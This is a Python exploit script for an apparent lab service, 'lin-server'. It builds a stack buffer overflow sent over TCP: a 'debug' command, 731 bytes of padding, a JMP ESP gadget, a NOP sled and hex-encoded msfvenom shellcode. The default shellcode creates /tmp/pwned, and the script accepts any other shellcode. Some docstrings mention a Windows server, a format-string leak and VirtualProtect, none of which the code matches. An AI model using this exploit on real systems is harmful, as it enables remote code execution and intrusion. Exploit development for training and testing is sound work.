#!/usr/bin/env python3
from __future__ import annotations
from argparse import (
    ArgumentParser as Parser,
    Namespace
)
from typing import (
    TypeVar,
    Union,
    Generic,
    Annotated,
    final,
    IO
)
from socket import (
    socket,
    AF_INET,
    SOCK_STREAM
)
from struct import (
    pack,
    unpack
)
from sys import (
    stdout,
    stderr,
    argv,
    exit
)
from abc import abstractmethod
from binascii import unhexlify


""" Generic type definitions """

# Generic exception type for error handling and presentation
_E = TypeVar("_E", bound=Union[str, bytes, Exception, None])
# Generic type for generation of ROP payloads
_A = TypeVar("_A", bound=Union[list, str, None])
# Generic byte-string type used for data manipulation
_B = TypeVar("_B", bound=Union[str, bytes, None])
# Generic socket type that allows None as a value
_S = TypeVar("_S", bound=Union[socket, None])
# Generic type that can be anything
_T = TypeVar("_T")


""" Abstract Template class used as the Exploit base """


class Template(Generic[_T, _B, _E, _S, _A]):
    """ Description:

        (i) An abstract base-class as the Template which implements common exploit methods

        A. Concrete implementations include:
            1. Basic helper methods for data manipulation
            2. Presentation methods for display purposes
            3. Socket methods for TCP connectivity
            4. Basic exploit methods for generating payloads

        B. Abstract methods include:
            1. Generation of exploit specific ROP payloads
            2. Execution of exploit specific business logic
            3. Main static method for instantiation purposes
    """
    def __init__(
        self,
        address: str = "172.31.24.110",
        port: int = 65534,
        bufferSize: int = 4,
        verbose: bool = False,
        throw: bool = False,
        base: int = 0x00000000,
        shellcode: str = "",
        **kw
    ) -> Annotated[None, """
        Base abstract Template class that implements common exploit methods
    """]:
        """ Constructor
        :param address: IP address of remote target
        :param port: TCP port of remote target
        :param bufferSize: Default size for socket buffering
        :param verbose: Enable debugging
        :param throw: Raise exceptions
        :param base: Default base-address value
        :param shellcode: Default shellcode payload
        :param kw: Additional key-pair arguments
        """
        # Create default TCP socket
        self.sock: socket = socket(AF_INET, SOCK_STREAM)
        # Convert hex-encoded shellcode to bytes
        self.shellcode: bytes = (
            shellcode if isinstance(shellcode, bytes)
            else unhexlify(shellcode)
        )
        # Default size for socket buffering
        self.bufferSize: int = bufferSize
        # Default ROP gadget lookup table
        self.gadgets: dict = dict()
        # Default PE base address
        self.base: int = base
        # Address and TCP port of target
        self.address: str = address
        self.port: int = port
        # Debugging settings
        self.verbose: bool = verbose
        self.throw: bool = throw
        # Update the instance attributes
        self.__dict__.update(**kw)

    """ Helper methods """

    @staticmethod
    def toString(value: _B) -> Annotated[str, """
        Casts bytes to a string or returns a string value
    """]:
        """ Cast to string
        :param value: A string or bytes value
        :return: Value as a string
        """
        return (
            value.decode()
            if isinstance(value, bytes)
            else str(value)
        )

    @staticmethod
    def toBytes(value: _B) -> Annotated[bytes, """
        Casts a string to bytes or returns a bytes value
    """]:
        """ Cast to bytes
        :param value: A bytes or string value
        :return: Value as bytes
        """
        return (
            value.encode()
            if isinstance(value, str)
            else value
        )

    @staticmethod
    def padding(size: int, byte: int = 0x90) -> Annotated[bytes, """
        Creates a byte-array of padding for a given size and byte
    """]:
        """ Create byte-padding
        :param size: Size of bytes to create
        :param byte: Byte to fill padding
        :return: Bytes array
        """
        return bytes([byte]) * size

    def unsigned(self: Template, data: _B) -> Annotated[int, """
        Converts a DWORD byte-array to a unsigned-long address 
    """]:
        """ Cast to unsigned-long (DWORD)
        :param data: Byte or string value
        :return: Unsigned-long integer
        """
        return self.unpack(
            unhexlify(
                self.toString(data).strip().ljust(8, "0")
            )
        )

    @staticmethod
    def pack(address: int) -> Annotated[bytes, """
        Converts a unsigned-long address to a little-endian byte-array
    """]:
        """ Convert unsigned-long to bytes
        :param address: Unsigned-long integer of DWORD address
        :return: Bytes in little-endian format
        """
        return pack("<L", address)

    @staticmethod
    def unpack(address: bytes) -> Annotated[int, """
        Converts a byte-array to a big-endian unsigned-long address    
    """]:
        """ Convert bytes to unsigned-long
        :param address: Little-endian bytes of DWORD address
        :return: Unsigned-long integer
        """
        return unpack(">L", address)[0]

    """ Presentation methods """

    def display(self: Template, value: _B, fd: IO = stdout) -> Annotated[Template, """
        Default method to write a value to stdout 
    """]:
        """ Write value to stdout or stderr
        :param value: String or bytes value to display
        :param fd: File descriptor to write with
        :return: Instance for fluent patterns
        """
        fd.write(f"{self.toString(value).strip()}\n")
        return self

    def error(self: Template, value: _E) -> Annotated[Template, """
        Displays an error and throws exceptions when throw is enabled    
    """]:
        """ Write error to stderr or raise exception
        :param value: String, bytes, or Exception value
        :return: Instance for fluent patterns
        """
        # If verbose is enabled, display error message via stderr
        if self.verbose:
            self.display(f"[!] ERROR: {value}", stderr)
        # Raise error is value is an Exception and enabled
        if issubclass(type(value), Exception):
            if self.throw:
                raise value
        return self

    def debug(self: Template, value: _B) -> Annotated[Template, """
        Displays debug messages when verbose is enabled    
    """]:
        """ Write debug value to stdout if verbose is enabled
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        # Display debug message is verbose is enabled
        return (
            self.display(f"[*] DEBUG: {value}")
            if self.verbose else self
        )

    def success(self: Template, value: _B) -> Annotated[Template, """
        Displays success messages     
    """]:
        """ Write success value to stdout
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        return self.display(f"[+] SUCCESS: {value}")

    def failure(self: Template, value: _B) -> Annotated[Template, """
        Displays failure messages using bold-red terminal characters    
    """]:
        """ Write failure value to stdout
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        return self.display(f"[!] FAILURE: {value}")

    def info(self: Template, value: _B) -> Annotated[Template, """
        Displays informational messages using green terminal characters    
    """]:
        """ Write informational value to stdout
        :param value: String or bytes value to display
        :return: Instance for fluent patterns
        """
        return self.display(f"[i] INFO: {value}")

    """ Socket methods """

    def connect(self: Template) -> Annotated[Template, """
        Connects to the given address and port via TCP
    """]:
        """ Connect TCP socket to remote IP address on a given port
        :return: Instance for fluent patterns
        """
        self.info(f"Connecting to: {self.address}:{self.port}")
        try:
            # Close any existing connection
            if bool(self.sock):
                self.debug(f"Already connected, closing existing connection")
                self.close()
            # Create a new socket and TCP connection to the remote target
            self.sock: _S = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.address, self.port))
            self.success(f"Connected to: {self.address}:{self.port}")
        except Exception as err:
            # Close the socket and handle error upon connection failure
            self.close()
            self.error(Exception(f"Connect error: {err}"))
        return self

    def send(self: Template, value: _B) -> Annotated[Template, """
        Sends bytes to the connected socket
    """]:
        """ Send value to remote connection over TCP socket
        :param value: String or bytes value to send
        :return: Instance for fluent patterns
        """
        try:
            # Throw exception of socket isn't connected
            if not bool(self.sock):
                raise Exception(f"Socket not connected")
            # Send value as bytes through socket
            self.sock.send(self.toBytes(value))
        except Exception as err:
            # Close the socket and handle error upon transmission failure
            self.close()
            self.error(Exception(f"Send error: {err}"))
        return self

    def receive(self: Template, *ag, **kw) -> Annotated[bytes, """
        Receives bytes of a given size from the socket 
    """]:
        """ Receive bytes from connected socket
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair arguments
        :return: Bytes received
        """
        buffer: _B = bytes()
        try:
            # Throw exception of socket isn't connected
            if not bool(self.sock):
                raise Exception(f"Socket not connected")
            # Retrieve bytes from socket
            buffer: _B = self.sock.recv(*ag, **kw)
        except Exception as err:
            # Close the socket and handle error upon transmission failure
            self.close()
            self.error(Exception(f"Receive error: {err}"))
        return buffer

    def until(self: Template, value: _B) -> Annotated[bytes, """
        Receives bytes from the socket until a pattern is matched 
    """]:
        """ Receive bytes until value is matched
        :param value: String or bytes value to match
        :return: Bytes received
        """
        (buffer, value) = (bytes(), self.toBytes(value))
        try:
            while True:
                try:
                    buffer += self.receive(self.bufferSize)
                    if value in buffer:
                        break
                except Exception as er:
                    self.error(f"Receive until error: {er}")
                    break
        except Exception as err:
            # Close the socket and handle error upon transmission failure
            self.close()
            self.error(Exception(f"Receive until error: {err}"))
        return buffer

    def close(self: Template) -> Annotated[Template, """
        Closes the connections socket
    """]:
        """ Close TCP connection and set socket to null
        :return: Instance for fluent patterns
        """
        try:
            # Check if socket exists
            if bool(self.sock):
                # Close socket and set the property to null
                self.info(f"Disconnecting from: {self.address}:{self.port}")
                self.sock.close()
                self.sock: _S = None
        except Exception as err:
            # Expected error if already closed
            self.debug(f"Close error: {err}")
        return self

    """ Exploit methods """

    def gadget(self: Template, key: str, *ag, **kw) -> Annotated[int, """
        Looks up a ROP gadget's unsigned-long base-address given the assembly key
    """]:
        """ Retrieve a ROP gadgets address
        :param key: String assembly instruction as lookup key
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair collection of arguments
        :return: Unsigned-long integer of gadget's address
        """
        return self.gadgets.get(key, *ag, **kw)

    def chain(self: Template, values: _A) -> Annotated[bytes, """
        Converts ROP chain instructions to bytes  
    """]:
        """ Generate bytes of a ROP chain
        :param values: Single instruction or collection of instructions
        :return: Bytes of ROP gadget chain
        """
        # ROP chain bytes to return
        result: bytes = bytes()
        try:
            # Ensure value is a array
            values: list = values if isinstance(values, list) else [values]
            # Iterate collection of values
            for value in values:
                # If value is bytes, append it to the ROP chain
                if isinstance(value, bytes):
                    result += value
                # If value is a string, lookup the gadget and append it
                if isinstance(value, str):
                    result += self.pack(self.gadget(value))
                # If the value is an integer, pack the unsigned-long value
                if isinstance(value, int):
                    result += self.pack(value)
        except Exception as err:
            # Handle unexpected error upon failure
            self.error(Exception(f"Chain error: {err}"))
        return result

    def update(self: Template) -> Annotated[Template, """
        Updates the table of ROP gadgets with leaked base
    """]:
        """ Update the addresses in the ROP lookup table
        :return: Instance for fluent patterns
        """
        self.info(f"Updating gadget table with leaked offset")
        try:
            # Iterate through copy of lookup table items
            for (gadget, value) in self.gadgets.copy().items():
                # Add leaked base-address to ROP offset
                self.gadgets[gadget] = self.base + value
            self.success(f"Gadget table updated")
        except Exception as err:
            # Handle unexpected error upon failure
            self.error(Exception(f"Update error: {err}"))
        return self

    """ Abstract exploit methods """

    @abstractmethod
    def rop(self: Template) -> Annotated[bytes, """
        Logic used to create the ROP chain
    """]:
        """ Abstract method to generate ROP payload
        :return: Bytes of ROP payload
        """
        ...

    @abstractmethod
    def execute(self: Template) -> Annotated[Template, """
        Logic used to execute the entire attack
    """]:
        """ Abstract method for exploit business logic
        :return: Instance for fluent patterns
        """
        ...

    @staticmethod
    @abstractmethod
    def main(*ag, **kw) -> Annotated[None, """
        Main static entry method to instantiate the instance
    """]:
        """ Main static method for instantiation
        :param ag: Optional packed array of arguments
        :param kw: Optional packed array of key-pair arguments
        :return: None
        """
        ...


""" Concrete exploit class implements attributes specific to the exploit """


# noinspection PyAttributeOutsideInit
class Exploit(Template[_T, _B, _E, _S, _A]):
    """ Description:

        (i) Concrete Exploit class that implements the Template base class
        (i) Specific to exploitation of vulnerable debug command and format-string

        A. Polymorphic methods include:
            1. Final method to override errors by closing the connection

        B. Concrete implementations of abstract methods include:
            1. Obtaining the win-server.exe base-address via format-string vulnerability
            2. Creation of position-independent ROP to call VirtualProtect() and execute shellcode
            3. Execution of business logic to exploit the memory leak and buffer overflow
            4. Main static method to parse arguments and instantiate the exploit
    """
    def __init__(
        self,
        command: _B = b"debug",
        crash: int = 731,
        *ag, **kw
    ) -> Annotated[None, """
        Concrete implementation of the abstract with exploit specific attributes 
    """]:
        """ Constructor
        :param command: Vulnerable command used to trigger buffer overflow
        :param crash: Offset to trigger crash for EIP control
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair arguments
        """
        # Call parent class constructor
        Template.__init__(self, *ag, **kw)
        # Set vulnerable command as bytes
        self.command: bytes = self.toBytes(command)
        # Set crash offset
        self.crash: int = crash
        # Concrete ROP lookup table for lin-server
        self.gadgets: dict = {
            # Jump to stack gadget (JMP ESP)
            "jmp esp": 0x08049b96,
        }

    """ Polymorphic method override for error handling """

    @final
    def error(self, value: _E) -> Annotated[Exploit, """
        Displays an error and throws exceptions when throw is enabled    
    """]:
        """ Handle exception and close connection
        :param value: String, bytes, or Exception
        :return: Instance for fluent patterns
        """
        # Close connection if throw is enabled
        if self.throw:
            self.close()
        # Call parent method with value
        return Template.error(self, value)

    """ Concrete exploit implementations """

    @final
    def rop(self) -> Annotated[bytes, """
        Logic used to create the ROP chain
    """]:
        """ Concrete implementation of ROP payload to call JMP ESP for direct execution
        :return: Bytes of ROP chain generated
        """
        self.info(f"Creating ROP payload call JMP ESP and execute shellcode")
        # Bytes buffer for the ROP payload
        buffer: _B = bytes()
        try:
            # Create the ROP buffer in bytes format
            buffer: bytes = self.chain([
                # Trigger execution via vulnerable command "debug"
                self.command,
                # Padding of 731 0x90 (NOP) bytes to control EIP
                self.padding(self.crash, 0x90),

                # Jump to ESP
                "jmp esp",

                # Padding and shellcode
                (self.pack(0x90909090) * 32),
                self.shellcode,
                (self.pack(0xcccccccc) * 27)
            ])
            # Set index to beginning of buffer
            self.success(f"ROP payload successfully")
        except Exception as err:
            # Close connection and handle exception upon failure
            self.error(Exception(f"Failed to create ROP payload: {err}"))
        return buffer

    @final
    def execute(self) -> Annotated[Template, """
        Logic used to execute the entire attack
    """]:
        """ Concrete implementation of exploit's main business logic
        :return: Instance for fluent patterns
        """
        try:
            # Connect to remote target
            self.connect()
            # Generate payload with JMP ESP and send it to the target
            self.info(f"Sending payload to target")
            self.send(self.rop())
            self.success(f"Payload sent to target")
            # Close any existing connection after exploitation
            self.close()
        except Exception as err:
            # Close connection and handle exception upon failure
            self.error(f"Exception running exploit: {err}")
        return self

    @staticmethod
    @final
    def main(*ag, **kw) -> Annotated[None, """
        Main static entry method to instantiate the instance
    """]:
        """ Concrete implementation of main method to parse arguments and instantiate exploit
        :param ag: Optional packed array of arguments
        :param kw: Optional packed key-pair collection of arguments
        :return: None
        """
        # Argument parser that contains constructor parameters
        parser: Parser = Parser(
            description="Buffer overflow exploit for Linux x86 'lin-server'",
            usage=f""" python3 {argv[0]} -a 172.31.24.110 -p 65534 -c "debug" -o 731 -s "$HEX_SHELLCODE" """,
            add_help=True
        )
        try:
            # Address argument, default set for local debugging
            parser.add_argument(
                "--address", "-a",
                dest="address",
                type=str,
                default="172.31.24.110",
                action="store",
                help="Remote IP address (default: 172.31.24.110)"
            )
            # Port argument, default set for local debugging
            parser.add_argument(
                "--port", "-p",
                dest="port",
                type=int,
                default=65534,
                action="store",
                help="Remote port (default: 65534)"
            )
            # Verbosity argument, false by default
            parser.add_argument(
                "--verbose", "-v",
                dest="verbose",
                default=False,
                action="store_true",
                help="Enable verbose output (default: false)"
            )
            # Raise exception argument, false by default
            parser.add_argument(
                "--throw", "-t",
                dest="throw",
                default=False,
                action="store_true",
                help="Raise exceptions (default: false)"
            )
            # Buffer size argument, default DWORD size
            parser.add_argument(
                "--buffer", "-b",
                dest="bufferSize",
                type=int,
                default=4,
                action="store",
                help="Socket buffer size (default: 4-bytes)"
            )
            # Vulnerable command argument, default "debug"
            parser.add_argument(
                "--command", "-c",
                dest="command",
                type=str,
                default="debug",
                action="store",
                help="Vulnerable command (default: debug)"
            )
            # Crash offset argument, default 731
            parser.add_argument(
                "--offset", "-o",
                dest="crash",
                type=int,
                default=731,
                action="store",
                help="Offset to overflow EIP (default: 731)"
            )
            # Shellcode argument in hex-string, default set to execute "calc"
            parser.add_argument(
                "--shellcode", "-s",
                dest="shellcode",
                type=str,
                action="store",
                help="Hex-encoded x86 shellcode to execute (default: touch /tmp/pwned)",
                default=(
                    # Default x86: msfvenom -p linux/x86/exec cmd='touch /tmp/pwned' -b "\x00\x0a\x0d"
                    "ddc0d97424f4bff239fd615b"
                    "2bc9b10e317b17037b178319"
                    "c51f94b73db8ce152450dcfa"
                    "214776d342e087438a92eefd"
                    "5db1a3e94f3644e91b59318a"
                    "8b85963821b6c7b0ce587d54"
                    "31f22e1dd03150"
                )
            )
            # Parse the arguments into a Namespace object
            ns: Namespace = parser.parse_args()
            # Ensure arguments were passed or display help and exit
            if len(argv) == 0:
                parser.print_help()
                exit(0)
            # Instantiate Exploit class using the Namespace packed key-pair values for the constructor
            exploit: Exploit = Exploit(**ns.__dict__)
            # Attempt to execute the exploit
            try:
                exploit.execute()
            except KeyboardInterrupt:
                # Terminate the connection if CTRL+C signal received
                exploit.close()
            except Exception as err:
                # Handle exception using the exploit class
                exploit.error(err)
            finally:
                # Terminate the connection gracefully when complete
                exploit.close()
        except Exception as error:
            # Handle exception in main upon failure
            stderr.write(f"Error in main: {error}")


""" Main method to begin execution """

if __name__ == '__main__':
    Exploit.main()
